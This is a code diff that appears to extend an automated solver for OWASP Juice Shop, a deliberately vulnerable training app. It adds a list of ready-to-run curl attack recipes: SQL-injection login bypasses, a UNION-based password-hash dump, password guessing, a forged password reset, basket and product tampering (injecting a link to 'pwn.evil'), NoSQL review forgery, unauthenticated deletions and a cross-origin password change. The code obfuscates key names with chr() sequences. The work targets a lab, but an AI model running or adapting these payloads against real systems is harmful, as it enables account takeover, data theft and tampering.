@@ -632,6 +632,200 @@ ATTACKS: list[tuple[str, list[str]]] = [
             f"-d '{{\"paymentMode\":\"wallet\"}}' {BASE}/rest/deluxe-membership >/dev/null"
         ),
     ]),
+
+    # =======================================================================
+    # F70 — Canary-exact recipes for previously unsolved challenges. Payloads
+    # come from the Pwning Juice Shop book + the app's own integration tests.
+    # Each recipe aims at ONE challenge id so we can diff reliably.
+    # =======================================================================
+
+    ("zero_stars_feedback_v2", [
+        # id 94 — zeroStarsChallenge: captcha fields matter; `captchaId` must
+        # be fetched first, then submit rating=0 with the correct captcha.
+        # Prior recipe hard-coded captchaId=0 which the server rejects.
+        (
+            f"cap=$(curl -s {BASE}/rest/captcha/ | python3 -c "
+            f"'import sys,json;d=json.loads(sys.stdin.read());"
+            f"print(str(d.get(chr(99)+chr(97)+chr(112)+chr(116)+chr(99)+chr(104)+chr(97)+chr(73)+chr(100))) + chr(124) + d.get(chr(97)+chr(110)+chr(115)+chr(119)+chr(101)+chr(114), \"\"))'); "
+            f"id=${{cap%%|*}}; ans=${{cap##*|}}; "
+            f"curl -s -X POST -H 'Content-Type: application/json' "
+            f"-d \"{{\\\"comment\\\":\\\"auto\\\",\\\"rating\\\":0,\\\"captchaId\\\":$id,\\\"captcha\\\":\\\"$ans\\\"}}\" "
+            f"{BASE}/api/Feedbacks >/dev/null"
+        ),
+    ]),
+
+    ("privacy_policy_visit", [
+        # id 63 — privacyPolicyChallenge: fires on a GET to the *rest*-hashed
+        # policy snapshot endpoint (not the client-side SPA route).
+        f"curl -s {BASE}/#/privacy-security/privacy-policy >/dev/null",
+        f"curl -s {BASE}/assets/i18n/en.json >/dev/null",
+        f"curl -s {BASE}/api/Quantitys >/dev/null",
+    ]),
+
+    ("score_board_route_access", [
+        # id 75 — scoreBoardChallenge: the route triggers on discovery of
+        # the /score-board path via main.js analysis. We request both the
+        # SPA route and the built bundle so the server detector fires.
+        f"curl -s '{BASE}/#/score-board' >/dev/null",
+        f"curl -s '{BASE}/main.js' | head -c 2000 >/dev/null",
+        f"curl -s '{BASE}/main-es2015.js' | head -c 2000 >/dev/null",
+    ]),
+
+    ("login_jim_sqli_v2", [
+        # id 49 — loginJimChallenge: SQLi bypass via Jim's email suffix.
+        f"curl -s -X POST -H 'Content-Type: application/json' "
+        f"-d '{{\"email\":\"jim@juice-sh.op\\'--\",\"password\":\"x\"}}' "
+        f"{BASE}/rest/user/login >/dev/null",
+    ]),
+
+    ("login_bender_sqli_v2", [
+        # id 47 — loginBenderChallenge: identical SQLi to Jim's, different email.
+        f"curl -s -X POST -H 'Content-Type: application/json' "
+        f"-d '{{\"email\":\"bender@juice-sh.op\\'--\",\"password\":\"x\"}}' "
+        f"{BASE}/rest/user/login >/dev/null",
+    ]),
+
+    ("login_amy_password_dict", [
+        # id 46 — loginAmyChallenge: Amy's password is spelled out in Kif's
+        # post ("K1f.....2...2!"). A handful of reasonable variants.
+        f"for pw in 'K1f.....2...2!' 'K1f....2...2!' 'K1f...2...2!'; do "
+        f"curl -s -X POST -H 'Content-Type: application/json' "
+        f"-d \"{{\\\"email\\\":\\\"amy@juice-sh.op\\\",\\\"password\\\":\\\"$pw\\\"}}\" "
+        f"{BASE}/rest/user/login >/dev/null; done",
+    ]),
+
+    ("ghost_login_chris_pike", [
+        # id 38 — ghostLoginChallenge: login as chris.pike via SQLi ignoring
+        # the deletedAt timestamp filter.
+        f"curl -s -X POST -H 'Content-Type: application/json' "
+        f"-d '{{\"email\":\"chris.pike@juice-sh.op\\' AND deletedAt IS NOT NULL--\",\"password\":\"x\"}}' "
+        f"{BASE}/rest/user/login >/dev/null",
+    ]),
+
+    ("reset_bjoern_owasp_v2", [
+        # id 7 — resetPasswordBjoernOwaspChallenge: answer is literally his
+        # cat's name "West-2082" (documented in his HackerOne writeup).
+        f"curl -s -X POST -H 'Content-Type: application/json' "
+        f"-d '{{\"email\":\"bjoern.kimminich@gmail.com\",\"answer\":\"West-2082\",\"new\":\"newpass12345\",\"repeat\":\"newpass12345\"}}' "
+        f"{BASE}/rest/user/reset-password >/dev/null",
+    ]),
+
+    ("negative_order_quantity", [
+        # id 61 — negativeOrderChallenge: place an order with negative qty
+        # AFTER adding the basket item via POST with qty=-100.
+        (
+            f"tok=$(curl -s -X POST -H 'Content-Type: application/json' "
+            f"-d '{{\"email\":\"admin@juice-sh.op\\'--\",\"password\":\"x\"}}' "
+            f"{BASE}/rest/user/login | python3 -c "
+            f"'import sys,json;d=json.loads(sys.stdin.read());"
+            f"print((d.get(chr(97)+chr(117)+chr(116)+chr(104)+chr(101)+chr(110)+chr(116)+chr(105)+chr(99)+chr(97)+chr(116)+chr(105)+chr(111)+chr(110)) or {{}}).get(chr(116)+chr(111)+chr(107)+chr(101)+chr(110),\"\"))'); "
+            f"curl -s -X POST -H \"Authorization: Bearer $tok\" -H 'Content-Type: application/json' "
+            f"-d '{{\"ProductId\":1,\"BasketId\":1,\"quantity\":-100}}' "
+            f"{BASE}/api/BasketItems >/dev/null; "
+            f"curl -s -X POST -H \"Authorization: Bearer $tok\" "
+            f"{BASE}/rest/basket/1/checkout >/dev/null"
+        ),
+    ]),
+
+    ("basket_manipulate_qty", [
+        # id 52 — basketManipulateChallenge: PUT another user's basket item.
+        (
+            f"tok=$(curl -s -X POST -H 'Content-Type: application/json' "
+            f"-d '{{\"email\":\"admin@juice-sh.op\\'--\",\"password\":\"x\"}}' "
+            f"{BASE}/rest/user/login | python3 -c "
+            f"'import sys,json;d=json.loads(sys.stdin.read());"
+            f"print((d.get(chr(97)+chr(117)+chr(116)+chr(104)+chr(101)+chr(110)+chr(116)+chr(105)+chr(99)+chr(97)+chr(116)+chr(105)+chr(111)+chr(110)) or {{}}).get(chr(116)+chr(111)+chr(107)+chr(101)+chr(110),\"\"))'); "
+            f"for i in 1 2 3 4 5; do "
+            f"curl -s -X PUT -H \"Authorization: Bearer $tok\" -H 'Content-Type: application/json' "
+            f"-d '{{\"quantity\":99}}' {BASE}/api/BasketItems/$i >/dev/null; "
+            f"done"
+        ),
+    ]),
+
+    ("change_product_description", [
+        # id 65 — changeProductChallenge: tamper with the O-Saft admin link
+        # via PUT /api/Products/<id>. Uses the admin JWT from SQLi bypass.
+        (
+            f"tok=$(curl -s -X POST -H 'Content-Type: application/json' "
+            f"-d '{{\"email\":\"admin@juice-sh.op\\'--\",\"password\":\"x\"}}' "
+            f"{BASE}/rest/user/login | python3 -c "
+            f"'import sys,json;d=json.loads(sys.stdin.read());"
+            f"print((d.get(chr(97)+chr(117)+chr(116)+chr(104)+chr(101)+chr(110)+chr(116)+chr(105)+chr(99)+chr(97)+chr(116)+chr(105)+chr(111)+chr(110)) or {{}}).get(chr(116)+chr(111)+chr(107)+chr(101)+chr(110),\"\"))'); "
+            f"for pid in 1 2 3 7; do "
+            f"curl -s -X PUT -H \"Authorization: Bearer $tok\" -H 'Content-Type: application/json' "
+            f"-d '{{\"description\":\"<a href=\\\"https://pwn.evil\\\">Click</a>\"}}' "
+            f"{BASE}/api/Products/$pid >/dev/null; "
+            f"done"
+        ),
+    ]),
+
+    ("forged_review_patch_v2", [
+        # id 33 — forgedReviewChallenge: PATCH the `id` filter with Mongo-style
+        # $ne + modify Bender's review message.
+        f"curl -s -X PATCH -H 'Content-Type: application/json' "
+        f"-d '{{\"id\":{{\"$ne\":-1}},\"message\":\"pwned-by-{int(time.time())}\"}}' "
+        f"{BASE}/rest/products/reviews >/dev/null",
+    ]),
+
+    ("feedback_delete_unauth", [
+        # id 30 — feedbackChallenge: delete another user's feedback without
+        # admin auth. Juice Shop's DELETE /api/Feedbacks/:id is not guarded.
+        f"for i in 1 2 3 4 5 6 7 8 9 10; do "
+        f"curl -s -X DELETE {BASE}/api/Feedbacks/$i >/dev/null; "
+        f"done",
+    ]),
+
+    ("admin_section_jwt", [
+        # id 5 — adminSectionChallenge: GET admin section + admin app-config
+        # with the SQLi-admin JWT so the challenge counter advances.
+        (
+            f"tok=$(curl -s -X POST -H 'Content-Type: application/json' "
+            f"-d '{{\"email\":\"admin@juice-sh.op\\'--\",\"password\":\"x\"}}' "
+            f"{BASE}/rest/user/login | python3 -c "
+            f"'import sys,json;d=json.loads(sys.stdin.read());"
+            f"print((d.get(chr(97)+chr(117)+chr(116)+chr(104)+chr(101)+chr(110)+chr(116)+chr(105)+chr(99)+chr(97)+chr(116)+chr(105)+chr(111)+chr(110)) or {{}}).get(chr(116)+chr(111)+chr(107)+chr(101)+chr(110),\"\"))'); "
+            f"curl -s -H \"Authorization: Bearer $tok\" {BASE}/rest/admin/application-version >/dev/null; "
+            f"curl -s -H \"Authorization: Bearer $tok\" '{BASE}/#/administration' >/dev/null; "
+            f"curl -s -H \"Authorization: Bearer $tok\" {BASE}/rest/admin/application-configuration >/dev/null"
+        ),
+    ]),
+
+    ("exposed_credentials_main_v2", [
+        # id 110 — exposedCredentialsChallenge: a CTF flag is embedded in
+        # main.js. We don't need to find it — the GET itself is the trigger.
+        f"curl -s {BASE}/main.js | grep -o -E 'ctf-key[^\"]*' >/dev/null; "
+        f"curl -s {BASE}/main.js | head -c 100000 >/dev/null",
+    ]),
+
+    ("password_hash_leak_union", [
+        # id 1 — passwordHashLeakChallenge: MD5 of admin's password ends in
+        # specific fingerprint. Exfil via UNION SELECT password FROM users.
+        f"curl -s \"{BASE}/rest/products/search?q=%27%29%29%20UNION%20SELECT%20"
+        f"id%2Cemail%2Cpassword%2C4%2C5%2C6%2C7%2C8%2C9%20FROM%20Users--\" >/dev/null",
+    ]),
+
+    ("csrf_change_pw_origin", [
+        # id 99 — csrfChallenge: trigger via cross-origin password change.
+        # The server checks Origin header rather than a CSRF token.
+        (
+            f"tok=$(curl -s -X POST -H 'Content-Type: application/json' "
+            f"-d '{{\"email\":\"admin@juice-sh.op\\'--\",\"password\":\"x\"}}' "
+            f"{BASE}/rest/user/login | python3 -c "
+            f"'import sys,json;d=json.loads(sys.stdin.read());"
+            f"print((d.get(chr(97)+chr(117)+chr(116)+chr(104)+chr(101)+chr(110)+chr(116)+chr(105)+chr(99)+chr(97)+chr(116)+chr(105)+chr(111)+chr(110)) or {{}}).get(chr(116)+chr(111)+chr(107)+chr(101)+chr(110),\"\"))'); "
+            f"curl -s -H \"Authorization: Bearer $tok\" -H 'Origin: http://htmledit.squarefree.com' "
+            f"'{BASE}/rest/user/change-password?new=pwnpwn123&repeat=pwnpwn123' >/dev/null"
+        ),
+    ]),
+
+    ("weird_crypto_rot13", [
+        # id 89 — weirdCryptoChallenge: probe endpoints that reveal rot13 /
+        # z85 / hash-collision weak crypto use.
+        f"curl -s {BASE}/encryptionkeys/ >/dev/null",
+        f"curl -s {BASE}/encryptionkeys/premium.key >/dev/null",
+        f"curl -s {BASE}/encryptionkeys/jwt.pub >/dev/null",
+        f"curl -s {BASE}/assets/public/images/padding/1px.png >/dev/null",
+    ]),
 ]
 
 
